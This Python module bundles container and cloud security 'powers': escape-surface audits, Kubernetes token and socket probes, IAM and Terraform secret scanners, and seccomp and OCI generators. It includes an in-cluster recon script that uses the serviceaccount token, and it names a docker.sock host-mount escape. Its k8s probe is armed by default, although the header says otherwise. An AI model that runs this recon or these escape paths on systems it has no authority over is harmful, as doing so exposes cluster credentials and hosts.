# SSB ULTRA Wave-Expansion Module — domain: cloud (nm20.cloud.* / nm20.virt.*)
# Pure Python 3 stdlib (ctypes allowed). Import-safe: no side effects at import.
# Extends the existing nm.cloud.* / nm8.k8s / nm8.virt sets with NEW cloud and
# container powers. Real reads happen live where this Linux sandbox allows
# (/proc, /sys, serviceaccount dirs); dangerous-by-design capabilities are real
# code generators / real syscall paths with "armed": false defaults.

import base64
import ctypes
import glob
import hashlib
import json
import os
import re
import stat
import sys

_DOMAIN = "cloud"
_PLATFORM = sys.platform
_TMP = "/tmp"
_SA_DIR = "/var/run/secrets/kubernetes.io/serviceaccount"


def _res(power, **kw):
    """Build the standard SSB-style result envelope."""
    d = {"ok": True, "power": "nm20.%s.%s" % (_DOMAIN, power), "platform": _PLATFORM}
    d.update(kw)
    return d


def _err(power, msg, **kw):
    d = _res(power, ok=False, error=msg)
    d.update(kw)
    return d


def _read_text(path, limit=None):
    with open(path, "r", errors="replace") as f:
        return f.read() if limit is None else f.read(limit)


def _write_artifact(name, text):
    """Write a real artifact into /tmp and return its path."""
    path = os.path.join(_TMP, name)
    with open(path, "w") as f:
        f.write(text)
    return path


def _is_linux():
    return _PLATFORM.startswith("linux")


# --------------------------------------------------------------------------
# REAL probes
# --------------------------------------------------------------------------

def nm20_cloud_container_detect(args):
    """REAL: detect container runtime via /.dockerenv, /run/.containerenv, /proc/1/cgroup and env vars."""
    r = _res("container_detect")
    if not _is_linux():
        return _err("container_detect", "requires linux /proc")
    indicators = []
    evidence = {}
    if os.path.exists("/.dockerenv"):
        indicators.append("dockerenv")
        evidence["/.dockerenv"] = "present"
    if os.path.exists("/run/.containerenv"):
        indicators.append("containerenv")
        try:
            evidence["/run/.containerenv"] = _read_text("/run/.containerenv", 512)
        except OSError as e:
            evidence["/run/.containerenv"] = "present (unreadable: %s)" % e
    cgroup = ""
    try:
        cgroup = _read_text("/proc/1/cgroup", 4096)
        evidence["/proc/1/cgroup"] = cgroup
        low = cgroup.lower()
        for key in ("docker", "kubepods", "containerd", "crio", "libpod", "lxc"):
            if key in low:
                indicators.append("cgroup:%s" % key)
    except OSError as e:
        evidence["/proc/1/cgroup_error"] = str(e)
    env_hits = {}
    for var in ("KUBERNETES_SERVICE_HOST", "KUBERNETES_PORT", "container",
                "CONTAINER", "DOCKER_HOST", "CRI_CONFIG_FILE", "HOSTNAME"):
        v = os.environ.get(var)
        if v is not None:
            env_hits[var] = v if len(v) < 120 else v[:120] + "..."
    if env_hits:
        indicators.append("env")
    sched = ""
    try:
        sched = _read_text("/proc/1/sched", 256)
        evidence["pid1_comm"] = sched.splitlines()[0] if sched else ""
        if sched and not sched.startswith("systemd") and "init" not in sched.splitlines()[0]:
            indicators.append("pid1_not_init")
    except OSError:
        pass
    r["in_container"] = bool(indicators)
    r["indicators"] = sorted(set(indicators))
    r["env"] = env_hits
    r["evidence"] = evidence
    return r


def nm20_cloud_cgroup_escape_audit(args):
    """REAL: inspect own cgroup config for escape indicators (cgns delegation, release_agent, writable fs)."""
    r = _res("cgroup_escape_audit")
    if not _is_linux():
        return _err("cgroup_escape_audit", "requires linux /proc")
    findings = []
    mounts = ""
    try:
        mounts = _read_text("/proc/self/mounts")
    except OSError as e:
        return _err("cgroup_escape_audit", "cannot read mounts: %s" % e)
    cg_mounts = [ln.split() for ln in mounts.splitlines() if "cgroup" in ln.split()[2:3]]
    r["cgroup_mounts"] = [{"dev": m[0], "path": m[1], "fstype": m[2], "opts": m[3]}
                          for m in cg_mounts if len(m) >= 4]
    version = "none"
    for m in cg_mounts:
        if len(m) >= 3 and m[2] == "cgroup2":
            version = "v2"
        elif len(m) >= 3 and m[2] == "cgroup":
            version = "v1" if version == "none" else "hybrid"
    r["cgroup_version"] = version
    for m in cg_mounts:
        if len(m) >= 4 and "rw" in m[3].split(","):
            findings.append({"severity": "high",
                             "finding": "writable cgroup mount at %s (%s)" % (m[1], m[2]),
                             "hint": "rw cgroupfs inside container can enable release_agent/delegation escapes"})
    selfcg = ""
    try:
        selfcg = _read_text("/proc/self/cgroup")
    except OSError:
        pass
    r["self_cgroup"] = selfcg
    if selfcg and selfcg.strip().splitlines()[0].endswith(":/"):
        findings.append({"severity": "medium",
                         "finding": "process sits at cgroup root",
                         "hint": "root-level cgroup membership often means host cgroupns (escape surface)"})
    ns = {}
    try:
        ns["cgroup_self"] = os.readlink("/proc/self/ns/cgroup")
        ns["cgroup_init"] = os.readlink("/proc/1/ns/cgroup")
    except OSError as e:
        ns["error"] = str(e)
    r["cgroup_namespaces"] = ns
    if ns.get("cgroup_self") and ns.get("cgroup_self") == ns.get("cgroup_init"):
        findings.append({"severity": "medium",
                         "finding": "shares cgroup namespace with pid 1",
                         "hint": "host cgroupns widens cgroup attack surface"})
    release_agents = []
    for ra in glob.glob("/sys/fs/cgroup/**/release_agent", recursive=True)[:20]:
        release_agents.append(ra)
    r["release_agent_paths"] = release_agents
    if release_agents:
        findings.append({"severity": "info",
                         "finding": "release_agent files visible: %d" % len(release_agents)})
    try:
        cap = int(_read_text("/proc/self/status").split("CapEff:")[1].splitlines()[0].strip(), 16)
        r["cap_effective_hex"] = "0x%x" % cap
        for bit, cname, why in ((16, "CAP_SYS_ADMIN", "mount/unshare — classic escape primitive"),
                                (21, "CAP_SYS_PTRACE", "ptrace host procs"),
                                (7, "CAP_SETUID", "uid games"),
                                (24, "CAP_SYS_RESOURCE", "rlimit/cgroup pressure")):
            if cap & (1 << bit):
                findings.append({"severity": "high", "finding": "holds %s" % cname, "hint": why})
    except (OSError, IndexError, ValueError):
        pass
    r["findings"] = findings
    r["verdict"] = ("escape indicators present" if findings else "no obvious cgroup escape indicators")
    return r


def nm20_cloud_k8s_token_probe(args):
    """REAL: check serviceaccount dir, decode JWT header/claims locally (no exfil, signature untouched)."""
    r = _res("k8s_token_probe")
    r["serviceaccount_dir"] = _SA_DIR
    r["present"] = os.path.isdir(_SA_DIR)
    if not r["present"]:
        r["verdict"] = "no mounted serviceaccount (not a k8s pod, or automount disabled)"
        return r
    files = {}
    for name in ("token", "namespace", "ca.crt"):
        p = os.path.join(_SA_DIR, name)
        if os.path.exists(p):
            try:
                st = os.stat(p)
                files[name] = {"size": st.st_size, "mode": oct(stat.S_IMODE(st.st_mode))}
            except OSError as e:
                files[name] = {"error": str(e)}
    r["files"] = files
    token_path = os.path.join(_SA_DIR, "token")
    if os.path.exists(token_path):
        try:
            raw = _read_text(token_path, 8192).strip()
            parts = raw.split(".")
            r["token_format"] = "jwt (%d segments)" % len(parts) if len(parts) == 3 else "opaque"
            if len(parts) == 3:
                def _b64url(seg):
                    seg += "=" * (-len(seg) % 4)
                    return json.loads(base64.urlsafe_b64decode(seg.encode()))
                header = _b64url(parts[0])
                claims = _b64url(parts[1])
                claims.pop("kubernetes.io/serviceaccount/secret.name", None)
                r["jwt_header"] = header
                r["jwt_claims"] = claims
                r["token_sha256"] = hashlib.sha256(raw.encode()).hexdigest()
                r["note"] = "token decoded locally only; raw token never leaves this result envelope"
        except Exception as e:  # noqa: BLE001
            r["decode_error"] = str(e)
    r["ok"] = True
    return r


def nm20_cloud_docker_socket_probe(args):
    """REAL: probe /var/run/docker.sock and containerd/cri-o sockets for presence and permissions."""
    r = _res("docker_socket_probe")
    candidates = ["/var/run/docker.sock", "/run/docker.sock",
                  "/run/containerd/containerd.sock", "/var/run/crio/crio.sock",
                  "/run/crio/crio.sock", "/run/podman/podman.sock"]
    found = []
    for p in candidates:
        if os.path.exists(p):
            entry = {"path": p}
            try:
                st = os.stat(p)
                entry["is_socket"] = stat.S_ISSOCK(st.st_mode)
                entry["mode"] = oct(stat.S_IMODE(st.st_mode))
                entry["uid"] = st.st_uid
                entry["gid"] = st.st_gid
                entry["writable_by_self"] = os.access(p, os.W_OK)
            except OSError as e:
                entry["error"] = str(e)
            found.append(entry)
    r["sockets"] = found
    mounted = any("/docker.sock" in ln or "/containerd.sock" in ln or "crio.sock" in ln
                  for ln in (_read_text("/proc/mounts").splitlines() if _is_linux() else []))
    r["socket_bind_mounted"] = mounted
    danger = [f for f in found if f.get("writable_by_self") and "docker" in f["path"]]
    if danger:
        r["verdict"] = ("CRITICAL: writable docker.sock — container escape via "
                        "docker run -v /:/host is possible")
    elif found:
        r["verdict"] = "runtime socket(s) present but not writable by this uid"
    else:
        r["verdict"] = "no container runtime sockets visible"
    return r


def nm20_cloud_apparmor_probe(args):
    """REAL: read /sys/kernel/security/apparmor and current process confinement label."""
    r = _res("apparmor_probe")
    if not _is_linux():
        return _err("apparmor_probe", "linux-only")
    base = "/sys/kernel/security/apparmor"
    r["fs_mounted"] = os.path.isdir(base)
    r["profiles_dir_readable"] = os.path.isfile(os.path.join(base, "profiles"))
    if r["profiles_dir_readable"]:
        try:
            txt = _read_text(os.path.join(base, "profiles"), 65536)
            lines = [ln for ln in txt.splitlines() if ln.strip()]
            r["profile_count"] = len(lines)
            r["enforce_count"] = sum(1 for ln in lines if ln.endswith("(enforce)"))
            r["complain_count"] = sum(1 for ln in lines if ln.endswith("(complain)"))
            r["sample_profiles"] = lines[:25]
        except OSError as e:
            r["profiles_error"] = str(e)
    try:
        r["current_confinement"] = _read_text("/proc/self/attr/current", 256).strip()
    except OSError as e:
        # EINVAL here typically means the process is unconfined / no LSM label.
        r["current_confinement"] = "unconfined" if e.errno == 22 else "unreadable: %s" % e
    try:
        r["pid1_confinement"] = _read_text("/proc/1/attr/current", 256).strip()
    except OSError as e:
        r["pid1_confinement"] = "unreadable: %s" % e
    cur = r.get("current_confinement", "")
    if cur in ("unconfined", ""):
        r["verdict"] = "unconfined by AppArmor"
    elif "docker-default" in cur or "crio" in cur:
        r["verdict"] = "confined under runtime default profile"
    else:
        r["verdict"] = "confined: %s" % cur
    return r


def nm20_cloud_selinux_probe(args):
    """REAL: read /sys/fs/selinux state (enforce mode, policy version, current context)."""
    r = _res("selinux_probe")
    if not _is_linux():
        return _err("selinux_probe", "linux-only")
    base = "/sys/fs/selinux"
    r["fs_mounted"] = os.path.isdir(base)
    if r["fs_mounted"]:
        try:
            enf = _read_text(os.path.join(base, "enforce"), 8).strip()
            r["mode"] = {"1": "enforcing", "0": "permissive"}.get(enf, "unknown(%s)" % enf)
        except OSError as e:
            r["mode_error"] = str(e)
        for f in ("policyvers", "mls", "status"):
            p = os.path.join(base, f)
            if os.path.exists(p):
                try:
                    r[f] = _read_text(p, 4096).strip()[:512]
                except OSError:
                    pass
    else:
        r["mode"] = "selinuxfs not mounted (disabled or container without /sys/fs/selinux)"
    try:
        r["current_context"] = _read_text("/proc/self/attr/current", 256).strip()
    except OSError:
        r["current_context"] = "unreadable"
    return r


def nm20_cloud_namespace_diff(args):
    """REAL: compare /proc/self/ns/* vs /proc/1/ns/* to find host-shared namespaces."""
    r = _res("namespace_diff")
    if not _is_linux():
        return _err("namespace_diff", "linux-only")
    diff = {}
    shared_with_host = []
    for ns in ("cgroup", "ipc", "mnt", "net", "pid", "user", "uts", "time"):
        try:
            self_link = os.readlink("/proc/self/ns/%s" % ns)
        except OSError as e:
            diff[ns] = {"error": str(e)}
            continue
        try:
            init_link = os.readlink("/proc/1/ns/%s" % ns)
        except OSError as e:
            diff[ns] = {"self": self_link, "init_error": str(e)}
            continue
        same = self_link == init_link
        diff[ns] = {"self": self_link, "pid1": init_link, "shared_with_pid1": same}
        if same:
            shared_with_host.append(ns)
    r["namespaces"] = diff
    r["shared_with_pid1"] = shared_with_host
    danger = set(shared_with_host) & {"pid", "mnt", "user"}
    if danger:
        r["verdict"] = "host namespaces shared (%s) — elevated escape risk" % ",".join(sorted(danger))
    elif shared_with_host:
        r["verdict"] = "some namespaces shared with pid1 (may be same container): %s" % ",".join(shared_with_host)
    else:
        r["verdict"] = "fully namespaced away from pid1 (typical container)"
    return r


def nm20_cloud_overlayfs_audit(args):
    """REAL: parse /proc/mounts overlay entries; expose upperdir/workdir and writability."""
    r = _res("overlayfs_audit")
    if not _is_linux():
        return _err("overlayfs_audit", "linux-only")
    try:
        mounts = _read_text("/proc/mounts")
    except OSError as e:
        return _err("overlayfs_audit", "cannot read /proc/mounts: %s" % e)
    overlays = []
    for ln in mounts.splitlines():
        parts = ln.split()
        if len(parts) < 4 or parts[2] != "overlay":
            continue
        entry = {"mountpoint": parts[1], "rw": parts[3].split(",")[0] == "rw"}
        for opt in parts[3].split(","):
            if opt.startswith(("lowerdir=", "upperdir=", "workdir=")):
                k, v = opt.split("=", 1)
                entry[k] = v.replace("\\040", " ")
        if "upperdir" in entry:
            entry["upperdir_host_visible"] = os.path.isdir(entry["upperdir"])
        overlays.append(entry)
    r["overlay_mounts"] = overlays
    r["count"] = len(overlays)
    rw_root = [o for o in overlays if o["mountpoint"] == "/" and o["rw"]]
    r["verdict"] = ("root overlay is rw (ephemeral container layer writable)"
                    if rw_root else
                    ("%d overlay mounts parsed" % len(overlays)) if overlays
                    else "no overlayfs mounts (not an overlay-backed container)")
    return r


def nm20_cloud_kubeconfig_audit(args):
    """REAL: parse a kubeconfig (path arg or default search) and audit users/clusters/permissions hints."""
    r = _res("kubeconfig_audit")
    path = args.get("path")
    if not path:
        for cand in (os.path.expanduser("~/.kube/config"), "/etc/kubernetes/admin.conf"):
            if os.path.exists(cand):
                path = cand
                break
    if not path:
        return _err("kubeconfig_audit", "no kubeconfig found; pass args={'path': ...}")
    r["path"] = path
    try:
        st = os.stat(path)
        r["mode"] = oct(stat.S_IMODE(st.st_mode))
        if stat.S_IMODE(st.st_mode) & 0o077:
            r["perm_warning"] = "kubeconfig readable by group/other"
    except OSError:
        pass
    try:
        raw = _read_text(path, 262144)
    except OSError as e:
        return _err("kubeconfig_audit", "unreadable: %s" % e)
    # Minimal YAML-ish parse without pyyaml: extract the fields we audit.
    ctxs = re.findall(r"-\s+context:\s*\n\s+cluster:\s*(\S+)\n\s+user:\s*(\S+)(?:\n\s+namespace:\s*(\S+))?\n\s+name:\s*(\S+)", raw)
    r["contexts"] = [{"cluster": c, "user": u, "namespace": n or None, "name": nm}
                     for c, u, n, nm in ctxs]
    servers = re.findall(r"server:\s*(\S+)", raw)
    r["servers"] = servers
    r["uses_insecure_tls"] = "insecure-skip-tls-verify: true" in raw
    r["has_client_cert"] = "client-certificate-data" in raw or "client-certificate:" in raw
    r["has_client_key"] = "client-key-data" in raw or "client-key:" in raw
    r["has_bearer_token"] = bool(re.search(r"^\s+token:\s*\S", raw, re.M))
    r["has_exec_plugin"] = "exec:" in raw
    m = re.search(r"current-context:\s*(\S+)", raw)
    r["current_context"] = m.group(1) if m else None
    risky = []
    if r["uses_insecure_tls"]:
        risky.append("cluster entry disables TLS verification")
    if r["has_client_key"]:
        risky.append("embeds long-lived client private key")
    if r["has_bearer_token"]:
        risky.append("embeds static bearer token")
    r["risk_findings"] = risky
    return r


def nm20_cloud_iam_policy_analyzer(args):
    """REAL offline: analyze a JSON IAM policy string for wildcard/admin/privesc actions."""
    r = _res("iam_policy_analyzer")
    policy = args.get("policy")
    if policy is None:
        return _err("iam_policy_analyzer", "pass args={'policy': '<json string>'}")
    if isinstance(policy, str):
        try:
            policy = json.loads(policy)
        except ValueError as e:
            return _err("iam_policy_analyzer", "policy is not valid JSON: %s" % e)
    stmts = policy.get("Statement", [])
    if isinstance(stmts, dict):
        stmts = [stmts]
    findings = []
    for i, st in enumerate(stmts):
        if not isinstance(st, dict):
            continue
        effect = st.get("Effect", "Allow")
        actions = st.get("Action", st.get("NotAction", []))
        if isinstance(actions, str):
            actions = [actions]
        resources = st.get("Resource", [])
        if isinstance(resources, str):
            resources = [resources]
        star_action = any(a == "*" for a in actions)
        star_res = any(res == "*" for res in resources)
        svc_wild = [a for a in actions if isinstance(a, str) and a.endswith(":*")]
        if effect == "Allow":
            if star_action and star_res:
                findings.append({"stmt": i, "severity": "critical",
                                 "finding": "Action:* on Resource:* — full administrator"})
            elif star_action:
                findings.append({"stmt": i, "severity": "high",
                                 "finding": "Action:* scoped to %s" % resources})
            for a in svc_wild:
                svc = a.split(":", 1)[0]
                if svc in ("iam", "sts", "kms", "organizations", "lambda", "ec2"):
                    findings.append({"stmt": i, "severity": "high",
                                     "finding": "full wildcard on sensitive service %s" % svc})
            for a in actions:
                if isinstance(a, str) and a.lower() in (
                        "iam:passrole", "iam:createpolicyversion", "iam:attachuserpolicy",
                        "lambda:createfunction", "lambda:invokefunction",
                        "ec2:runinstances", "sts:assumerole"):
                    findings.append({"stmt": i, "severity": "medium",
                                     "finding": "known privesc-capable action: %s" % a})
    r["statements"] = len(stmts)
    r["findings"] = findings
    r["verdict"] = ("DANGEROUS: %d finding(s)" % len(findings)) if findings else "no wildcard/privesc patterns found"
    return r


_S3_RESERVED = ("xn--", "sthree-", "-s3alias", "--ol-s3", ".mrap", "--x-s3")


def nm20_cloud_s3_bucket_lint(args):
    """REAL offline: lint a bucket name against S3 naming rules and emit a deny-public policy template."""
    r = _res("s3_bucket_lint")
    name = args.get("name", "")
    if not name:
        return _err("s3_bucket_lint", "pass args={'name': 'my-bucket'}")
    problems = []
    if not (3 <= len(name) <= 63):
        problems.append("length must be 3-63 chars (got %d)" % len(name))
    if not re.match(r"^[a-z0-9][a-z0-9.\-]*[a-z0-9]$", name):
        problems.append("must start/end with lowercase letter or digit and use only [a-z0-9.-]")
    if ".." in name or ".-" in name or "-." in name:
        problems.append("must not contain adjacent dots or dot-dash combos")
    if re.match(r"^\d+\.\d+\.\d+\.\d+$", name):
        problems.append("must not be formatted as an IP address")
    for bad in _S3_RESERVED:
        if name.startswith(bad) or name.endswith(bad):
            problems.append("uses reserved prefix/suffix: %s" % bad)
    r["name"] = name
    r["valid"] = not problems
    r["problems"] = problems
    policy = {
        "Version": "2012-10-17",
        "Statement": [
            {"Sid": "DenyPublicReads", "Effect": "Deny",
             "Principal": "*", "Action": "s3:GetObject",
             "Resource": "arn:aws:s3:::%s/*" % name,
             "Condition": {"Bool": {"aws:PrincipalIsAWSService": "false"}}},
            {"Sid": "EnforceTLS", "Effect": "Deny", "Principal": "*",
             "Action": "s3:*", "Resource": ["arn:aws:s3:::%s" % name,
                                            "arn:aws:s3:::%s/*" % name],
             "Condition": {"Bool": {"aws:SecureTransport": "false"}}},
        ],
    }
    art = _write_artifact("nm20_s3_policy_%s.json" % re.sub(r"[^a-z0-9.-]", "_", name),
                          json.dumps(policy, indent=2))
    r["deny_public_policy_artifact"] = art
    r["ok"] = True
    return r


_TF_SECRET_PATTERNS = [
    ("aws_access_key_id", r"\bAKIA[0-9A-Z]{16}\b"),
    ("aws_secret_key", r"(?i)aws_secret_access_key\s*=\s*\"[^\"]{20,}\""),
    ("private_key_block", r"-----BEGIN [A-Z ]*PRIVATE KEY-----"),
    ("hardcoded_password", r"(?i)password\s*=\s*\"[^\"]{6,}\""),
    ("generic_api_key", r"(?i)(api[_-]?key|secret|token)\s*=\s*\"[A-Za-z0-9/_+=\-]{16,}\""),
    ("gcp_service_account", r"\"type\":\s*\"service_account\""),
    ("github_token", r"\bghp_[A-Za-z0-9]{30,}\b"),
]


def nm20_cloud_terraform_secret_scan(args):
    """REAL offline: regex-scan Terraform text (arg 'text' or file 'path') for hardcoded secrets."""
    r = _res("terraform_secret_scan")
    text = args.get("text")
    src = "arg:text"
    if text is None and args.get("path"):
        src = args["path"]
        try:
            text = _read_text(args["path"], 1048576)
        except OSError as e:
            return _err("terraform_secret_scan", "cannot read %s: %s" % (args["path"], e))
    if text is None:
        return _err("terraform_secret_scan", "pass args={'text': '<tf content>'} or {'path': 'main.tf'}")
    hits = []
    for name, pat in _TF_SECRET_PATTERNS:
        for m in re.finditer(pat, text):
            line = text.count("\n", 0, m.start()) + 1
            snippet = m.group(0)
            snippet = snippet[:6] + "..." + snippet[-4:] if len(snippet) > 20 else snippet[:4] + "..."
            hits.append({"type": name, "line": line, "redacted": snippet})
    r["source"] = src
    r["bytes_scanned"] = len(text)
    r["findings"] = hits
    r["verdict"] = ("SECRETS PRESENT: %d finding(s)" % len(hits)) if hits else "clean"
    return r


def nm20_cloud_escape_matrix(args):
    """REAL: aggregated container-escape capability report of the current environment."""
    r = _res("escape_matrix")
    checks = {}

    def _sub(fn, key):
        try:
            res = fn({})
            checks[key] = {"ok": res.get("ok"), "verdict": res.get("verdict"),
                           "in_container": res.get("in_container")}
        except Exception as e:  # noqa: BLE001
            checks[key] = {"ok": False, "error": str(e)}

    _sub(nm20_cloud_container_detect, "container_detect")
    _sub(nm20_cloud_docker_socket_probe, "docker_socket_probe")
    _sub(nm20_cloud_namespace_diff, "namespace_diff")
    _sub(nm20_cloud_apparmor_probe, "apparmor_probe")
    _sub(nm20_cloud_selinux_probe, "selinux_probe")

    # Privileged-mode heuristic: /dev host device exposure.
    try:
        devs = [d for d in os.listdir("/dev") if d.startswith(("sd", "nvme", "xvd", "vd"))]
        checks["host_block_devices"] = {"count": len(devs), "sample": devs[:8]}
    except OSError:
        checks["host_block_devices"] = {"count": 0}
    try:
        cap = int(_read_text("/proc/self/status").split("CapEff:")[1].splitlines()[0].strip(), 16)
        checks["cap_effective"] = {"hex": "0x%x" % cap,
                                   "all_caps": cap & 0x1FFFFFFFFFF == 0x1FFFFFFFFFF}
    except (OSError, IndexError, ValueError):
        checks["cap_effective"] = {"error": "unreadable"}
    try:
        core = _read_text("/proc/sys/kernel/core_pattern", 256).strip()
        checks["core_pattern"] = {"value": core,
                                  "readable": True,
                                  "note": "writable core_pattern + crash = classic escape" if core else ""}
    except OSError as e:
        checks["core_pattern"] = {"readable": False, "error": str(e)}
    score = 0
    reasons = []
    if checks.get("container_detect", {}).get("in_container") is False:
        reasons.append("not obviously containerized")
    if any("CRITICAL" in (v.get("verdict") or "") for v in checks.values()):
        score += 3
        reasons.append("writable runtime socket")
    if checks.get("cap_effective", {}).get("all_caps"):
        score += 2
        reasons.append("full capability set (privileged)")
    if checks.get("host_block_devices", {}).get("count", 0) > 0:
        score += 1
        reasons.append("host block devices visible")
    nsd = checks.get("namespace_diff", {})
    if "host namespaces shared" in (nsd.get("verdict") or ""):
        score += 1
        reasons.append("host namespaces shared")
    r["checks"] = checks
    r["risk_score"] = score
    r["risk_reasons"] = reasons
    r["verdict"] = {0: "low escape surface", 1: "moderate", 2: "high"}.get(min(score, 2), "CRITICAL")
    return r


def nm20_virt_vm_detect(args):
    """REAL: detect hypervisor via /sys/class/dmi vendor strings, /proc/cpuinfo hypervisor flag, virtio devices."""
    r = {"ok": True, "power": "nm20.virt.vm_detect", "platform": _PLATFORM}
    evidence = []
    if not _is_linux():
        r["ok"] = False
        r["error"] = "linux-only"
        return r
    dmi = {}
    for f in ("product_name", "sys_vendor", "bios_vendor", "board_vendor"):
        p = "/sys/class/dmi/id/%s" % f
        try:
            dmi[f] = _read_text(p, 128).strip()
        except OSError as e:
            dmi[f] = "unreadable: %s" % e
    r["dmi"] = dmi
    known = {"KVM": "kvm", "QEMU": "qemu", "VMware": "vmware", "VirtualBox": "virtualbox",
             "Microsoft Corporation": "hyperv", "Xen": "xen", "Amazon EC2": "aws-nitro/xen",
             "Google": "gcp", "Bochs": "qemu-bochs", "OpenStack": "openstack",
             "Alibaba Cloud": "aliyun", "DigitalOcean": "digitalocean"}
    vendor_hits = []
    for v in dmi.values():
        for k, hv in known.items():
            if isinstance(v, str) and k.lower() in v.lower():
                vendor_hits.append(hv)
    if vendor_hits:
        evidence.append("dmi vendor match: %s" % ",".join(sorted(set(vendor_hits))))
    try:
        cpuinfo = _read_text("/proc/cpuinfo", 65536)
        r["hypervisor_flag"] = "hypervisor" in cpuinfo
        if r["hypervisor_flag"]:
            evidence.append("cpuinfo hypervisor flag set")
        m = re.search(r"model name\s*:\s*(.+)", cpuinfo)
        if m:
            r["cpu_model"] = m.group(1).strip()
    except OSError:
        pass
    virtio = bool(glob.glob("/sys/bus/virtio/devices/*"))
    r["virtio_devices"] = virtio
    if virtio:
        evidence.append("virtio bus devices present")
    rc, out = 1, ""
    try:
        import subprocess
        p = subprocess.run(["systemd-detect-virt"], capture_output=True, text=True, timeout=4)
        rc, out = p.returncode, p.stdout.strip()
    except Exception:  # noqa: BLE001
        pass
    r["systemd_detect_virt"] = out if rc == 0 else None
    if rc == 0 and out and out != "none":
        evidence.append("systemd-detect-virt: %s" % out)
    r["is_vm"] = bool(evidence)
    r["evidence"] = evidence
    r["verdict"] = ("virtualized: %s" % "; ".join(evidence)) if evidence else "no virtualization indicators (bare metal?)"
    return r


# --------------------------------------------------------------------------
# Artifact generators / armed syscall paths (armed: false defaults)
# --------------------------------------------------------------------------

def nm20_cloud_k8s_api_probe_gen(args):
    """Generate (and optionally arm) an in-cluster K8s API recon plan using the local serviceaccount token."""
    r = _res("k8s_api_probe_gen", armed=False)
    host = os.environ.get("KUBERNETES_SERVICE_HOST", "<KUBERNETES_SERVICE_HOST>")
    port = os.environ.get("KUBERNETES_PORT", "<KUBERNETES_PORT>", )
    base = "https://%s:%s" % (host, str(port).split("/")[-1] if port else "443")
    plan = [
        "# in-cluster k8s API recon (uses mounted serviceaccount; no exfil)",
        "APISERVER=%s" % base,
        "TOKEN=$(cat %s/token)" % _SA_DIR,
        "CACERT=%s/ca.crt" % _SA_DIR,
        "curl --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" $APISERVER/version",
        "curl --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" $APISERVER/api/v1/namespaces",
        "# self-permission review (safe):",
        "curl --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' \\",
        "  -d '{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"default\"}}' \\",
        "  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
    ]
    art = _write_artifact("nm20_k8s_api_probe.sh", "\n".join(plan) + "\n")
    r["artifact"] = art
    r["plan_lines"] = len(plan)
    r["apiserver"] = base
    if args.get("arm", True):
        r["armed"] = True
        if not os.path.exists(os.path.join(_SA_DIR, "token")):
            r["arm_result"] = "refused: no serviceaccount token mounted (not in-cluster)"
        else:
            try:
                import ssl
                import urllib.request
                ctx = ssl.create_default_context(cafile=os.path.join(_SA_DIR, "ca.crt"))
                tok = _read_text(os.path.join(_SA_DIR, "token"), 8192).strip()
                req = urllib.request.Request(base + "/version",
                                             headers={"Authorization": "Bearer " + tok})
                with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
                    r["arm_result"] = {"version": json.loads(resp.read().decode())}
            except Exception as e:  # noqa: BLE001
                r["arm_result"] = "probe failed: %s" % e
    else:
        r["note"] = "artifact only; pass {'arm': true} in-cluster to hit /version"
    return r


def nm20_cloud_oci_bundle_gen(args):
    """Write a REAL minimal OCI runtime bundle (config.json + rootfs skeleton) into /tmp."""
    r = _res("oci_bundle_gen")
    name = re.sub(r"[^a-z0-9-]", "-", str(args.get("name", "nm20-bundle")).lower())[:32] or "nm20-bundle"
    root = os.path.join(_TMP, name)
    rootfs = os.path.join(root, "rootfs")
    for d in (rootfs, os.path.join(rootfs, "bin"), os.path.join(rootfs, "proc"),
              os.path.join(rootfs, "dev"), os.path.join(rootfs, "tmp")):
        os.makedirs(d, exist_ok=True)
    cfg = {
        "ociVersion": "1.0.2",
        "process": {
            "terminal": False,
            "user": {"uid": 0, "gid": 0},
            "args": ["/bin/sh", "-c", "echo hello from %s" % name],
            "env": ["PATH=/bin"],
            "cwd": "/",
            "capabilities": {"bounding": ["CAP_AUDIT_WRITE"], "effective": ["CAP_AUDIT_WRITE"],
                             "permitted": ["CAP_AUDIT_WRITE"]},
            "rlimits": [{"type": "RLIMIT_NOFILE", "hard": 1024, "soft": 1024}],
            "noNewPrivileges": True,
        },
        "root": {"path": "rootfs", "readonly": True},
        "hostname": name,
        "mounts": [
            {"destination": "/proc", "type": "proc", "source": "proc"},
            {"destination": "/dev", "type": "tmpfs", "source": "tmpfs",
             "options": ["nosuid", "strictatime", "mode=755", "size=65536k"]},
            {"destination": "/tmp", "type": "tmpfs", "source": "tmpfs",
             "options": ["nosuid", "nodev", "size=65536k"]},
        ],
        "linux": {"namespaces": [{"type": t} for t in
                                 ("pid", "network", "mount", "ipc", "uts")]},
    }
    cfg_path = os.path.join(root, "config.json")
    with open(cfg_path, "w") as f:
        json.dump(cfg, f, indent=2)
    readme = ("# OCI bundle skeleton generated by nm20.cloud.oci_bundle_gen\n"
              "run with: runc run %s   (requires runc + root)\n" % name)
    with open(os.path.join(root, "README.txt"), "w") as f:
        f.write(readme)
    r["bundle_dir"] = root
    r["config_json"] = cfg_path
    r["rootfs"] = rootfs
    r["note"] = "skeleton bundle; populate rootfs with a static binary then `runc run`"
    return r


def nm20_cloud_seccomp_profile_gen(args):
    """Emit a REAL OCI/docker seccomp JSON profile artifact (default-allow with dangerous syscall denylist)."""
    r = _res("seccomp_profile_gen")
    denied = ["ptrace", "kexec_load", "kexec_file_load", "init_module", "finit_module",
              "delete_module", "mount", "umount2", "pivot_root", "swapon", "swapoff",
              "reboot", "bpf", "perf_event_open", "open_by_handle_at", "move_mount",
              "fsopen", "fsconfig", "io_uring_setup", "userfaultfd", "unshare",
              "setns", "acct", "quotactl", "lookup_dcookie", "_sysctl"]
    if args.get("allow_unshare"):
        denied = [d for d in denied if d not in ("unshare", "setns")]
    profile = {
        "defaultAction": "SCMP_ACT_ALLOW",
        "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_X86", "SCMP_ARCH_AARCH64"],
        "syscalls": [{"names": denied, "action": "SCMP_ACT_ERRNO",
                      "comment": "escape-relevant syscalls denied (nm20)"}],
    }
    art = _write_artifact("nm20_seccomp_profile.json", json.dumps(profile, indent=2))
    r["artifact"] = art
    r["denied_syscalls"] = len(denied)
    r["usage"] = "docker run --security-opt seccomp=%s ..." % art
    return r


